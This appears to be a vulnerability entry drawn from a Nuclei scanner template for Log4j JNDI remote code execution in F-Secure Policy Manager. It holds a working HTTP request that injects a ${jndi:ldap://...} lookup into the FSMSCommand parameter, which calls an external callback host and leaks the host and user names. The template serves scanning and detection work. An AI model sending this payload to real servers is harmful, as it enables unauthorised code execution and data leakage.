# Vulnerability: F-Secure Policy Manager - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77
**Source:** Nuclei Template (`f-secure-policymanager-log4j-rce.yaml`)

## Description
F-Secure Policy Manager is susceptible to Log4j JNDI remote code execution.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /fsms/fsmsh.dll?FSMSCommand=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}} HTTP/1.1
Host: {{Hostname}}
Referrer: {{RootURL}}
```

